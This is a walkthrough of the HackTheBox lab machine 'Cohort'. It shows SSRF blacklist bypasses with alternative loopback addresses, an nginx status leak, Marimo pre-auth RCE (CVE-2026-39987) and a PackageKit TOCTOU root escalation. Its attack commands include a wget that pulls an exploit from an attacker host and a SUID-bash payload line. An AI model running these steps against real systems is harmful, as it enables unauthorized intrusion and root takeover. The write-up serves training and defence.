# HackTheBox — Cohort

> **Disclaimer** — Educational writeup of a controlled lab environment (HackTheBox). Flags have been replaced with `<FLAG_USER>` / `<FLAG_ROOT>`. **Do not use these techniques against systems without explicit authorization.**

---


## Overview

**Cohort** is a Linux machine whose attack chain begins with an **SSRF (Server-Side Request Forgery)** flaw in an apparently harmless web form, and escalates through three distinct stages:

1. A "Source URL" field in the web portal allows the server to make HTTP requests to arbitrary locations — but with a simple blacklist that blocks the obvious values (`127.0.0.1`, `localhost`).
2. By bypassing that blacklist with alternative representations of the loopback address, it's possible to reach an internal *status* endpoint of the reverse proxy (nginx), which **leaks the full upstream configuration** — including a hidden internal subdomain that isn't publicly disclosed.
3. That subdomain points to a **Marimo** instance (an interactive Python notebook), running a version vulnerable to **pre-authentication RCE (CVE-2026-39987)**.
4. Exploiting it grants access to the `marimo` user, from which privilege escalation is achieved through a **TOCTOU (Time-Of-Check to Time-Of-Use)** vulnerability in **PackageKit** (CVE-2026-41651), culminating in root access.

| Stage | Vector |
|---|---|
| Initial access (discovery) | SSRF in the portal's "Source URL" field, with blacklist bypass |
| Internal reconnaissance | Reverse proxy's `/status` endpoint exposes config and hidden subdomain |
| Initial access (exploitation) | CVE-2026-39987 — pre-authentication RCE in Marimo 0.20.4 |
| Root privilege | CVE-2026-41651 — TOCTOU in PackageKit |

---

## Reconnaissance

```bash
nmap -Pn -sV -sC <TARGET_IP>
```

**Result:**

```text
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 <hash> (ECDSA)
|_  256 <hash> (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
|_ssl-date: TLS randomness does not represent time
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

One particularly useful detail: the SSL certificate has a **wildcard Subject Alternative Name** (`DNS:*.cohort.htb`), suggesting the existence of additional subdomains not yet known — a lead that gets confirmed later on.

---

## Port Analysis

### Port 22 — SSH

Requires valid credentials to grant access to the machine. Kept in mind for a later stage.

### Port 80/443 — HTTP(S)

```bash
echo '<TARGET_IP> cohort.htb' | sudo tee -a /etc/hosts
curl -I http://cohort.htb
```

**Result:**

```text
HTTP/1.1 301 Moved Permanently
Server: nginx/1.24.0 (Ubuntu)
Location: https://cohort.htb/
```

A closer look at the nginx version (1.24.0, Ubuntu) didn't reveal any directly applicable CVE in this context — the real attack surface is the web application itself, not the web server.

The homepage presents **Cohort Analytics**, referencing a team (`Mara Quinteros`, `Devin Oyeleran`), and the investigation's focus shifted to the endpoint:

```text
https://cohort.htb/portal.html
```

This contains a form field called **"Source URL"**, which immediately raises suspicion of an **SSRF** vulnerability — the server likely makes an HTTP request to the supplied URL and returns (or processes) the result.

---

## Discovering SSRF in the Portal

The SSRF hypothesis is tested with the most obvious values first:

```text
http://127.0.0.1
http://localhost
```

Both were **blocked** — the application has a simple blacklist filtering these literal values.

---

## Bypassing the SSRF Blacklist

SSRF blacklists that only filter the literal strings `127.0.0.1` and `localhost` are notoriously easy to bypass, because there are **multiple equivalent representations** of the loopback address that most naive filters don't cover:

| Representation | Equivalent to |
|---|---|
| `http://0.0.0.0` | `127.0.0.1` (on many systems, the local "default route") |
| `http://127.1` | `127.0.0.1` (short IP notation — the OS fills in the missing octets) |
| `http://0` | `127.0.0.1` (0 is interpreted as `0.0.0.0`, which in turn resolves to localhost on many network stacks) |

Testing these alternatives, the endpoint **responded successfully**, confirming the bypass:

```html
<!doctype html>
<html lang="en">
<head>
<title>Cohort Analytics</title>
...
<div id="app" data-page="home" aria-busy="true">
  <div class="boot">...Loading Cohort Analytics...</div>
</div>
<script src="/assets/app.js" defer></script>
</body>
</html>
```

This confirms that the server can indeed reach its own local web application through the "Source URL" field — the next step is trying to discover **internal endpoints** not exposed publicly.

---

## Leaking the Internal Proxy Configuration

Using the same SSRF, common administration/diagnostic endpoint paths were tested:

```text
http://127.1/admin
http://127.1/status
```

The `http://127.1/status` endpoint returned critical information — the **internal nginx reverse proxy configuration**, including the list of configured *upstreams*:

```json
{
  "service": "cohort-edge",
  "status": "ok",
  "generated_by": "nginx",
  "upstreams": [
    {
      "name": "marketing",
      "host": "cohort.htb",
      "root": "/**/***/***"
    },
    {
      "name": "insights-api",
      "host": "cohort.htb",
      "path": "/api/",
      "target": "127.0.0.1:5000"
    },
    {
      "name": "notebooks",
      "host": "**********************",
      "target": "127.0.0.1:****",
      "note": "internal analyst workspace, not for external use"
    }
  ]
}
```

> **Critical finding:** this diagnostic endpoint, intended for internal use (likely by monitoring tools), exposes a **completely hidden subdomain** (`nb-1be3782a8afd3ad5.cohort.htb`), never publicly referenced, pointing to an internal service on port `8888` — explicitly flagged by its own note as "internal analyst workspace, not for external use".

This is exactly what the wildcard SAN noted during initial recon is useful for: the certificate covers `*.cohort.htb`, allowing this randomly-named subdomain (a form of "security through obscurity") to use HTTPS without triggering certificate warnings.

### Adding the hidden subdomain to `/etc/hosts`

```bash
echo "<TARGET_IP> nb-1be3782a8afd3ad5.cohort.htb" | sudo tee -a /etc/hosts
```

---

## Identifying the Internal Service (Marimo)

Visiting:

```text
https://*****************************/auth/login
```

Analyzing the page and its resources confirmed this to be **Marimo**, an interactive Python notebook environment (an alternative to Jupyter), running version **0.20.4**.

### Searching for known exploits

```bash
searchsploit marimo
```

**Result:**

```text
Exploit Title                                 |  Path
----------------------------------------------------------------
Marimo 0.20.4 - RCE                            | multiple/webapps/52673.py
```

Further research confirmed this version is affected by **[CVE-2026-39987](https://nvd.nist.gov/vuln/detail/CVE-2026-39987)**, a **pre-authentication remote code execution** vulnerability. A dedicated public PoC is available:

> **Exploit:** [CVE-2026-39987-Marimo-RCE](https://github.com/Industri4l-H3ll-Xpl0it3rs/CVE-2026-39987-Marimo-RCE)

---

## Exploitation — CVE-2026-39987 (Marimo Pre-Auth RCE)

### Getting the exploit

```bash
git clone https://github.com/Industri4l-H3ll-Xpl0it3rs/CVE-2026-39987-Marimo-RCE.git
cd CVE-2026-39987-Marimo-RCE
pip3 install websocket-client
```

### Checking the exploit's options

```bash
python3 CVE-2026-39987.py --help
```

### Running it against the target

```bash
python3 CVE-2026-39987.py \
  -t <TARGET_IP> \
  -H ********************* \
  -p /terminal/ws \
  -P 443 \
  -s wss
```

> The exploit communicates over a **secure WebSocket (`wss`)** directly with Marimo's terminal endpoint (`/terminal/ws`), abusing the lack of authentication on that channel to inject and execute arbitrary commands on the server.

### Confirming access

```bash
id
```

**Result:**

```text
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
```

---

## User Flag

```bash
ls
# notebooks  user.txt

cat user.txt
```

**Result:** `<FLAG_USER>`

---

## Privilege Escalation Enumeration

With access as `marimo`, standard Linux privesc enumeration was performed:

```bash
id                    # confirm user and groups
sudo -l               # check what can run with sudo
uname -a               # kernel version
cat /etc/os-release    # distro
find / -perm -4000 -type f 2>/dev/null   # SUID binaries
ps aux                # running processes (especially as root)
```

The combination of findings (**Ubuntu 24.04.4** and the **PackageKit** service running) pointed directly to a specific vulnerability: **[CVE-2026-41651](https://nvd.nist.gov/vuln/detail/CVE-2026-41651)**, a **TOCTOU (Time-Of-Check to Time-Of-Use)** flaw in PackageKit.

### What is a TOCTOU vulnerability?

A **TOCTOU** vulnerability occurs when a program **checks** a condition (e.g., a file's signature/integrity, a resource's permissions) at one point in time, but **uses** that resource later — and, between the check and the use, an attacker manages to **swap the resource** for a malicious one, without the program noticing. In PackageKit's case, the flaw allows the content of a `.deb` package being installed to be swapped for a malicious payload between the moment the privileged service verifies it and the moment it actually installs it.

### Confirming the PackageKit version

```bash
dpkg -l | grep -i packagekit
```

**Result:**

```text
ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5
ii  libpackagekit-glib2-18:amd64          1.2.8-2ubuntu1.5
hi  packagekit                            1.2.8-2ubuntu1.2
ii  packagekit-tools                      1.2.8-2ubuntu1.2
```

Version confirmed as vulnerable.

---

## Privilege Escalation — CVE-2026-41651 (PackageKit TOCTOU)

### Exploit logic

In summary, the exploit's payload creates a **SUID** binary from `bash`, taking advantage of the race-condition window in PackageKit:

```bash
cp /bin/bash /tmp/.suid_bash && chmod u+s /tmp/.suid_bash
```

This, by itself, is just the final action executed **inside** the payload — the exploit automates all of the timing-synchronization logic needed to swap the package between its verification and installation by PackageKit, which runs as root.

### Getting the exploit

```bash
git clone https://github.com/gbuyssens/CVE-2026-41651.git
cd CVE-2026-41651
```

### Serving the exploit from the attacking machine

```bash
python3 -m http.server 8080
```

### Transferring it to the target machine

```bash
wget http://<ATTACKER_IP>:8080/CVE-2026-41651.py -O /tmp/CVE-2026-41651.py
```

### Running the exploit

```bash
cd /tmp
python3 CVE-2026-41651.py
```

### Confirming the elevated privilege

```bash
.suid_bash-5.2# id
```

**Result:**

```text
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
```

The **`euid=0(root)`** confirms that, while the real `uid` is still `marimo`, the **effective user ID** is root — thanks to the SUID bit on the swapped `bash` binary, any command run from this shell executes with full root privileges.

---

## Root Flag

```bash
.suid_bash-5.2# cat /root/root.txt
```

**Result:** `<FLAG_ROOT>`

---

## Lessons Learned

- **SSRF blacklists based on literal strings** (`127.0.0.1`, `localhost`) are trivial to bypass — there are dozens of alternative representations of loopback addresses (`0.0.0.0`, `127.1`, `0`, `[::1]`, decimal/octal/hex IP notation) that a naive filter won't cover. The correct defense is to **resolve** the supplied hostname/IP and validate the resulting address against a list of **private/reserved ranges**, not against strings.
- **Internal diagnostic/status endpoints** should never be reachable through SSRF nor exposed without authentication — even seemingly "harmless" information (like proxy configuration) can reveal hidden internal infrastructure.
- **"Security through obscurity"** (randomly-named, undocumented subdomains) is not a real security measure — once discovered by any means (in this case, SSRF), the attacker has direct access to the "hidden" service.
- **Interactive notebook software** (Marimo, Jupyter, and similar) are high-risk targets when exposed without authentication, because the tool's very nature is to execute arbitrary code.
- **TOCTOU vulnerabilities** in privileged package managers (PackageKit, in this case) are particularly dangerous because they exploit the window between checking and using files — the fix requires atomic operations (checking and using the same file descriptor, without reopening the path).

---



## Tools Used

- `nmap` — port and service reconnaissance
- `curl` — manual SSRF testing and HTTP enumeration
- Public exploit for CVE-2026-39987 (Marimo pre-authentication RCE, over WebSocket)
- `searchsploit` — locating public exploits
- `dpkg` — confirming installed package versions
- Public exploit for CVE-2026-41651 (PackageKit TOCTOU)
- `python3 -m http.server` — serving exploits for transfer via `wget`

---

